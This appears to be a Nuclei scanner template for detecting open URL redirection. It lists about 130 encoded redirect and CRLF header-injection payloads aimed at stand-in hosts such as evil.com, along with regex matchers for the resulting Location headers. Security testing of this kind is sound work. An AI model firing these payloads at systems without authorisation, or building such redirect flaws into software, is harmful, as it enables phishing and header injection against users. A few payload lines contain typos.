id: slash-url-redirection

info:
  name: Slash Url Redirection
  author: SirBugs,reewardius
  severity: low
  tags: redirect,generic
  
http:
  - method: GET
    path:
      - "{{BaseURL}}#/\evil.com/"
      - "{{BaseURL}}/%0a/{{Host}}.bing.com/"
      - "{{BaseURL}}/%0d%0a/{{Host}}.bing.com/"
      - "{{BaseURL}}/%0d/{{Host}}.bing.com/"
      - "{{BaseURL}}/%5c%5cevil.com//"
      - "{{BaseURL}}/#/evil.com"
      - "{{BaseURL}}/%00/evil.com"
      - "{{BaseURL}}/%0a/evil.com"
      - "{{BaseURL}}/%0d%0a/{{Host}}.bing.com/"
      - "{{BaseURL}}/%0d%0aLocation:%20https://evil.com"
      - "{{BaseURL}}/%0d/evil.com"
      - "{{BaseURL}}/%2e%2e%2f/{{Host}}.bing.com%2f"
      - "{{BaseURL}}/%2e/evil.com"
      - "{{BaseURL}}/%5c/%2f%2e%2e/evil.com"
      - "{{BaseURL}}/%5c/%5c/%5c{{Hos}}.bing.com/"
      - "{{BaseURL}}/%5cevil.com"
      - "{{BaseURL}}/%5c{{Host}}.bing.com/"
      - "{{BaseURL}}/%EF%BC%http://evil.com"
      - "{{BaseURL}}/-/evil.com"
      - "{{BaseURL}}/../..%20evil.com"
      - "{{BaseURL}}/../../evil.com"
      - "{{BaseURL}}//%0d%0ahttp://evil.com/"
      - "{{BaseURL}}////;@evil.com"
      - "{{BaseURL}}////evil.com"
      - "{{BaseURL}}////evil.com/%2e%2e"
      - "{{BaseURL}}////{{Host}}.bing.com/"
      - "{{BaseURL}}///;@evil.com"
      - "{{BaseURL}}///evil%E3%80%82com"
      - "{{BaseURL}}///evil.com"
      - "{{BaseURL}}///evil.com/"
      - "{{BaseURL}}///evil.com/%2f%2e%2e"
      - "{{BaseURL}}///evil.com@//"
      - "{{BaseURL}}///{{RootURL}}evil.com/%2f%2e%2e"
      - "{{BaseURL}}//;@evil.com"
      - "{{BaseURL}}//@evil.com"
      - "{{BaseURL}}//@{{Host}}.bing.com/"
      - "{{BaseURL}}//\evil.com"
      - "{{BaseURL}}//\tevil.com/"
      - "{{BaseURL}}//evil%00.com"
      - "{{BaseURL}}//evil%0a%0d.com"
      - "{{BaseURL}}//evil%0d.com"
      - "{{BaseURL}}//evil%E3%80%82com"
      - "{{BaseURL}}//evil.com"
      - "{{BaseURL}}//evil.com/%2F.."
      - "{{BaseURL}}//evil.com//"
      - "{{BaseURL}}//evil.com@//"
      - "{{BaseURL}}//evil.com\tevil.com/"
      - "{{BaseURL}}//https://evil.com@//"
      - "{{BaseURL}}//{{Host}}.bing.com/"
      - "{{BaseURL}}/;/evil.com"
      - "{{BaseURL}}/<>//evil.com"
      - "{{BaseURL}}/?@evil.com"
      - "{{BaseURL}}/@evil.com"
      - "{{BaseURL}}/\evil.com"
      - "{{BaseURL}}/evil.com"
      - "{{BaseURL}}/evil.com/%2F.."
      - "{{BaseURL}}/evil.com/..;/css"
      - "{{BaseURL}}/evil.com/?"
      - "{{BaseURL}}/https://%09/bing.com"
      - "{{BaseURL}}/https:evil.com"
      - '{{BaseURL}}/%2fbing.com/%2e%2e/tr'
      - '{{BaseURL}}/%5cbing.com'
      - '{{BaseURL}}//%3A%2F%2Fevil%E3%80%82com'
      - '{{BaseURL}}//%3A%2F%2Fevil.com'
      - '{{BaseURL}}//%FF@evil%E3%80%82com'
      - '{{BaseURL}}//%FF@evil.com'
      - '{{BaseURL}}//.evil%E3%80%82com'
      - '{{BaseURL}}//.evil.com'
      - '{{BaseURL}}//////bing.com/%2e%2e/tr'
      - '{{BaseURL}}//////evil%E3%80%82com'
      - '{{BaseURL}}//////evil%E3%80%82com/%2f..'
      - '{{BaseURL}}//////evil.com'
      - '{{BaseURL}}//////evil.com/%2f..'
      - '{{BaseURL}}/////evil%E3%80%82com'
      - '{{BaseURL}}/////evil.com'
      - '{{BaseURL}}////evil%E3%80%82com'
      - '{{BaseURL}}////evil%E3%80%82com/%2f..'
      - '{{BaseURL}}////evil.com'
      - '{{BaseURL}}////evil.com/%2f..'
      - '{{BaseURL}}////http://bing.com/%2F'
      - '{{BaseURL}}////http://bing.com/%2F..'
      - '{{BaseURL}}////http://bing.com/%2F../'
      - '{{BaseURL}}////http://bing.com/..%2F'
      - '{{BaseURL}}////https://bing.com/%2F'
      - '{{BaseURL}}///\\/\\evil%E3%80%82com\\}'
      - '{{BaseURL}}///\\/\\evil.com\\}'
      - '{{BaseURL}}///bing.com'
      - '{{BaseURL}}///https://evil%E3%80%82com'
      - '{{BaseURL}}///https://evil.com'
      - '{{BaseURL}}//@evil%E3%80%82com'
      - '{{BaseURL}}//@evil.com'
      - '{{BaseURL}}//evil%E3%80%82com'
      - '{{BaseURL}}//evil.com'
      - '{{BaseURL}}//hTTps://evil%E3%80%82com'
      - '{{BaseURL}}//hTTps://evil.com'
      - '{{BaseURL}}//http%3A%2F%2Fevil%E3%80%82com'
      - '{{BaseURL}}//http%3A%2F%2Fevil.com'
      - '{{BaseURL}}//http:///@evil%E3%80%82com//{{Hostname}}'
      - '{{BaseURL}}//http:///@evil.com//{{Hostname}}'
      - '{{BaseURL}}//http://bing.com/%2F'
      - '{{BaseURL}}//http://bing.com/%2F..'
      - '{{BaseURL}}//http://bing.com/%2F../'
      - '{{BaseURL}}//http://bing.com/..%2F'
      - '{{BaseURL}}//http://evil%E3%80%82com'
      - '{{BaseURL}}//http://evil.com'
      - '{{BaseURL}}//http://{{Hostname}}.evil%E3%80%82com'
      - '{{BaseURL}}//http://{{Hostname}}.evil.com'
      - '{{BaseURL}}//http://{{Hostname}}@evil%E3%80%82com'
      - '{{BaseURL}}//http://{{Hostname}}@evil.com'
      - '{{BaseURL}}//https%3A%2F%2Fevil%E3%80%82com'
      - '{{BaseURL}}//https%3A%2F%2Fevil.com'
      - '{{BaseURL}}//https://bing.com/%2F'
      - '{{BaseURL}}//https://evil%E3%80%82com'
      - '{{BaseURL}}//https://evil.com'
      - '{{BaseURL}}//https://{{Hostname}}.evil%E3%80%82com'
      - '{{BaseURL}}//https://{{Hostname}}.evil.com'
      - '{{BaseURL}}//https://{{Hostname}}@evil%E3%80%82com'
      - '{{BaseURL}}//https://{{Hostname}}@evil.com'
      - '{{BaseURL}}//https:\\evil%E3%80%82com'
      - '{{BaseURL}}//https:\\evil.com'
      - '{{BaseURL}}//https:evil%E3%80%82com'
      - '{{BaseURL}}//https:evil.com'
      - '{{BaseURL}}/?https://bing.com'
      - '{{BaseURL}}/_https@bing.com'
      - '{{BaseURL}}/https@bing.com'
      
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: regex
        part: header
        regex:
          - '(?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]*)evil\.com\/?(\/|[^.].*)?$'
          - '(?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]*)bing\.com\/?(\/|[^.].*)?$'

      - type: status
        status:
          - 301
          - 302
          - 303
          - 304
          - 306
          - 307
          - 308
        condition: or
